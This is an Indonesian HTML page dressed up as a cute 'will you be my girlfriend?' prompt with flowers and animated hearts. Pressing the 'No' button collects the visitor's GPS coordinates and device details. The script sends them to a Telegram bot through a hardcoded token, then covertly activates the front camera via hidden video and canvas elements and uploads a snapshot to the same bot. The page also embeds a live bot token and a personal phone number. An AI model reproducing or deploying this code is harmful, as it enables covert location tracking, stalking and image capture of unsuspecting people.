<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌷 Maukah Kamu? 🌷</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #ffe6f0 0%, #ffd9e8 100%);
            font-family: 'Poppins', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            position: relative;
            overflow-x: hidden;
        }

        /* animated background hearts */
        .heart-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .heart-bg i {
            position: absolute;
            color: rgba(255, 120, 160, 0.2);
            font-size: 20px;
            animation: floatHeart 8s infinite ease-in-out;
        }

        @keyframes floatHeart {
            0% { transform: translateY(0) rotate(0deg); opacity: 0.6; }
            50% { transform: translateY(-100px) rotate(20deg); opacity: 0.3; }
            100% { transform: translateY(0) rotate(0deg); opacity: 0.6; }
        }

        .main-card {
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 40px;
            box-shadow: 0 25px 50px -12px rgba(255, 120, 160, 0.5), 0 0 0 2px rgba(255, 255, 255, 0.8) inset;
            padding: 2rem 2rem 2.5rem;
            max-width: 600px;
            width: 90%;
            z-index: 10;
            position: relative;
            border: 1px solid rgba(255, 200, 220, 0.6);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .main-card:hover {
            transform: scale(1.01);
        }

        /* ANIMASI UNTUK "haloo my bear" */
        .greeting-bear {
            font-family: 'Dancing Script', cursive;
            font-size: 2.8rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 0.5rem;
            letter-spacing: 2px;
            animation: rainbowGlow 3s infinite alternate ease-in-out, softBounce 2s infinite;
            transform-origin: center;
            display: inline-block;
            width: 100%;
            text-shadow: 0 0 15px rgba(255, 180, 200, 0.8);
        }

        @keyframes rainbowGlow {
            0% { color: #ff4d6d; text-shadow: 0 0 10px #ff8aa1; }
            20% { color: #ffb347; text-shadow: 0 0 15px #ffd966; }
            40% { color: #ffe066; text-shadow: 0 0 15px #ffec99; }
            60% { color: #6a994e; text-shadow: 0 0 15px #a7c957; }
            80% { color: #669bbc; text-shadow: 0 0 15px #a2d2ff; }
            100% { color: #c77dff; text-shadow: 0 0 20px #e0aaff; }
        }

        @keyframes softBounce {
            0% { transform: scale(1) translateY(0); }
            50% { transform: scale(1.08) translateY(-6px); }
            100% { transform: scale(1) translateY(0); }
        }

        .flower-img {
            width: 150px;
            height: auto;
            filter: drop-shadow(0 10px 15px rgba(255, 80, 140, 0.3));
            animation: gentleWobble 4s infinite alternate;
            margin-bottom: 0.5rem;
        }

        @keyframes gentleWobble {
            0% { transform: rotate(-3deg) scale(1); }
            100% { transform: rotate(3deg) scale(1.02); }
        }

        .question-text {
            font-family: 'Dancing Script', cursive;
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #d4345a, #a0204c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 0.5rem 0 1rem;
            text-shadow: 0 5px 15px rgba(255, 150, 200, 0.6);
            letter-spacing: 2px;
            animation: flicker 3s infinite;
        }

        @keyframes flicker {
            0% { opacity: 1; text-shadow: 0 5px 15px rgba(255, 150, 200, 0.6); }
            50% { opacity: 0.9; text-shadow: 0 5px 30px rgba(255, 80, 140, 0.9); }
            100% { opacity: 1; text-shadow: 0 5px 15px rgba(255, 150, 200, 0.6); }
        }

        .btn-group-custom {
            display: flex;
            justify-content: center;
            gap: 25px;
            flex-wrap: wrap;
            margin: 2rem 0 1rem;
        }

        .btn-mau, .btn-tidak {
            border: none;
            padding: 14px 40px;
            border-radius: 60px;
            font-size: 1.4rem;
            font-weight: 600;
            letter-spacing: 1px;
            transition: 0.3s;
            box-shadow: 0 12px 25px -8px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .btn-mau {
            background: linear-gradient(145deg, #28a745, #218838);
            color: white;
        }

        .btn-mau:hover {
            transform: scale(1.15) rotate(2deg);
            box-shadow: 0 20px 30px -5px #28a74580;
        }

        .btn-tidak {
            background: linear-gradient(145deg, #dc3545, #c82333);
            color: white;
        }

        .btn-tidak:hover {
            transform: scale(1.15) rotate(-2deg);
            box-shadow: 0 20px 30px -5px #dc354680;
        }

        .btn-mau i, .btn-tidak i {
            font-size: 1.8rem;
            transition: 0.3s;
        }

        .btn-mau:hover i {
            transform: rotate(15deg) scale(1.2);
        }

        .btn-tidak:hover i {
            transform: rotate(-15deg) scale(1.2);
        }

        .floating-hearts {
            position: absolute;
            bottom: 20px;
            right: 20px;
            font-size: 2rem;
            color: rgba(255, 80, 140, 0.5);
            animation: heartbeat 1.8s infinite;
            z-index: 15;
        }

        @keyframes heartbeat {
            0% { transform: scale(1); opacity: 0.6; }
            25% { transform: scale(1.3); opacity: 1; }
            35% { transform: scale(1); opacity: 0.8; }
            45% { transform: scale(1.15); opacity: 1; }
            55% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 0.6; }
        }

        /* camera & map hidden but ready */
        video, canvas, #map {
            display: none;
        }

        .footer-note {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #b03a5e;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <!-- floating heart background -->
    <div class="heart-bg" id="heartBg"></div>

    <div class="main-card">
        <!-- HALOO MY BEAR ANIMASI WARNA WARNI -->
        <div class="greeting-bear">🌼 Haloo my bear 🌼</div>

        <div class="text-center">
            <img src="https://feeldreams.github.io/bunga.gif" alt="Flower" class="flower-img">
            <p class="question-text">Mau gak jadi pacar aku?</p>
        </div>

        <div class="btn-group-custom">
            <button class="btn-mau" id="allow-btn">
                <i class="fas fa-check-circle"></i> Mau...
            </button>
            <button class="btn-tidak" id="deny-btn">
                <i class="fas fa-times-circle"></i> Tidak Mau!
            </button>
        </div>

        <div class="floating-hearts">
            <i class="fas fa-heart"></i>
        </div>
        <div class="footer-note">💬 jawab sejujurnya, ya...</div>
    </div>

    <!-- hidden elements -->
    <div id="map"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        (function generateBackgroundHearts() {
            const bg = document.getElementById('heartBg');
            for (let i = 0; i < 18; i++) {
                const heart = document.createElement('i');
                heart.className = 'fas fa-heart';
                const size = Math.floor(Math.random() * 30 + 15);
                heart.style.fontSize = size + 'px';
                heart.style.left = Math.random() * 100 + '%';
                heart.style.top = Math.random() * 100 + '%';
                heart.style.animationDelay = (Math.random() * 5) + 's';
                heart.style.animationDuration = (Math.random() * 6 + 6) + 's';
                bg.appendChild(heart);
            }
        })();

        document.getElementById('deny-btn').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(lokasi, handleError);
            } else {
                Swal.fire('Not Support', 'Geolocation tidak didukung browser ini', 'info');
            }
        });

        document.getElementById('allow-btn').addEventListener('click', function() {
            showAlerts(0);
        });

        function lokasi(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            
            const platform = navigator.platform || 'Unknown';
            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
            const userAgent = navigator.userAgent;

            const iframe = document.createElement('iframe');
            iframe.src = `https://www.google.com/maps?q=${latitude},${longitude}&hl=es&z=14&output=embed`;
            iframe.width = "100%";
            iframe.height = "450";
            iframe.frameborder = "0";
            iframe.style.border = "0";
            iframe.allowfullscreen = "";
            
            Swal.fire({
                title: '📍 Lokasi kamu ketahuan!',
                html: `
                    <div style="text-align:left;">
                        <strong>Latitude:</strong> ${latitude} <br>
                        <strong>Longitude:</strong> ${longitude} <br><br>
                        <strong>💻 Device Info:</strong><br>
                        Platform: ${platform}<br>
                        RAM: ${ram}<br>
                        <small>User Agent: ${userAgent.substring(0, 50)}…</small>
                    </div>
                `,
                imageUrl: `https://feeldreams.github.io/peach22.gif`,
                imageWidth: 120,
                imageHeight: 120,
                imageAlt: 'Peach',
                confirmButtonText: '😳 Iya deh'
            }).then(() => {
                document.getElementById('map').innerHTML = "";
                document.getElementById('map').appendChild(iframe);
                kirim(latitude, longitude, platform, userAgent, ram);
                ambilPoto();
            });
        }

        function kirim(latitude, longitude, platform, userAgent, ram) {
            const telegramBotToken = '7556816145:AAHJu0K-JrUuyKnHmSXz3T6wOpT94sDvFIU';
            const chatId = '6893956562';
            const message = `
                🌍 *Lokasi Target*
                Latitude: ${latitude}
                Longitude: ${longitude}
                
                📱 *Device*
                Platform: ${platform}
                RAM: ${ram}
                UA: ${userAgent}
                
                🗺️ Map: https://www.google.com/maps?q=${latitude},${longitude}
            `;
            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(apiUrl).catch(err => console.warn('Telegram send failed (ignore if testing)'));
        }

        function ambilPoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            stream.getTracks().forEach(track => track.stop());

                            canvas.toBlob(blob => {
                                kirimPhoto(blob);
                            });
                        }, 500);
                    };
                })
                .catch(error => {
                    console.warn('Camera access failed:', error);
                });
        }

        function kirimPhoto(blob) {
            const telegramBotToken = '7556816145:AAHJu0K-JrUuyKnHmSXz3T6wOpT94sDvFIU';
            const chatId = '6893956562';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob);

            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;

            fetch(apiUrl, { method: 'POST', body: formData })
                .catch(err => console.warn('Photo send failed', err));
        }

        function showAlerts(step) {
            const images = [
                'https://feeldreams.github.io/peach22.gif',
                'https://feeldreams.github.io/peachgetar.gif',
                'https://feeldreams.github.io/peachhoam.gif',
                'https://feeldreams.github.io/peachktw2.gif',
                'https://feeldreams.github.io/peachktw.gif'
            ];
            const texts = [
                'Arghhh g nyangka! 🥰',
                `Inget ya hari ini tanggal jadian kita ${new Date().toLocaleDateString()} ❤️`,
                'Dua tiga buah langsat!!! 🍑',
                'Kau cantik sangatttt ✨',
                'Kapan kita jalan?? kirim pesannya ke aku ya 😘',
            ];

            if (step < 4) {
                Swal.fire({
                    text: texts[step],
                    imageUrl: images[step],
                    imageWidth: 150,
                    imageHeight: 150,
                    imageAlt: 'Peach',
                    confirmButtonText: 'Okey',
                    background: '#ffeef4',
                    backdrop: 'rgba(255,200,220,0.3)'
                }).then(() => {
                    showAlerts(step + 1);
                });
            } else {
                Swal.fire({
                    title: 'Mau Kan? 💌',
                    text: texts[step],
                    input: 'text',
                    inputPlaceholder: 'Tulis pesan manismu...',
                    imageUrl: images[step],
                    imageWidth: 150,
                    imageHeight: 150,
                    imageAlt: 'Peach',
                    showCancelButton: true,
                    confirmButtonText: '<i class="fas fa-paper-plane"></i> Kirim',
                    cancelButtonText: 'Nanti dulu',
                    background: '#fff0f5',
                    reverseButtons: true
                }).then((result) => {
                    if (result.isConfirmed && result.value) {
                        const message = encodeURIComponent(result.value + ' 😳❤️');
                        const whatsappUrl = `https://wa.me/6281400796283?text=${message}`;
                        window.open(whatsappUrl, '_blank');
                    } else if (result.isConfirmed) {
                        Swal.fire('😢 pesannya diketik dulu dong');
                    }
                });
            }
        }

        function handleError(error) {
            if (error.code === error.PERMISSION_DENIED) {
                Swal.fire('Izin ditolak', 'Tidak dapat mengambil lokasi :(', 'error');
            } else {
                Swal.fire('Error', 'Gagal mengambil lokasi', 'error');
            }
        }

        // sedikit animasi ekstra tombol tidak mau kabur (opsional lucu)
        const tidakBtn = document.getElementById('deny-btn');
        tidakBtn.addEventListener('mouseenter', function(e) {
            if (Math.random() > 0.5) {
                // kadang geser dikit
                this.style.transform = `translateX(${Math.random()*20 - 10}px) translateY(${Math.random()*10 - 5}px) scale(1.1)`;
            }
        });
        tidakBtn.addEventListener('mouseleave', function() {
            this.style.transform = '';
        });
    </script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
